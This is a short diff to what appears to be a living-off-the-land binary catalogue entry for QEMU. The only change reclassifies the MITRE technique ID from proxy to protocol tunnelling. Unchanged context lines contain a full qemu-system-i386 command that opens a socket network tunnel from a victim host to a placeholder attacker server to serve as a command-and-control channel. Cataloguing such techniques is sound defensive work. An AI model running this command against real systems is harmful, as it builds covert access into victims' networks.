@@ -10,14 +10,14 @@ Usage:
     Category: C2 Channel
     Privileges: User
     Limitations: None
-    MitreID: T1090
+    MitreID: T1572
   - Steps: qemu-system-i386.exe -m 1M -netdev user,id=lan,restrict=off -netdev socket,id=sock,connect=<AttackerServerIP>:<AttackerServerPort> -netdev hubport,id=port-lan,hubid=0,netdev=lan -netdev hubport,id=port-sock,hubid=0,netdev=sock -nographic
     Description: "Steps to create a QEMU socket network device on victim's host"
     Usecase: Establishing C2 Channel
     Category: C2 Channel
     Privileges: User
     Limitations: None
-    MitreID: T1090
+    MitreID: T1572
 Resources:
   - Link: https://securelist.com/network-tunneling-with-qemu
 Acknowledgement:
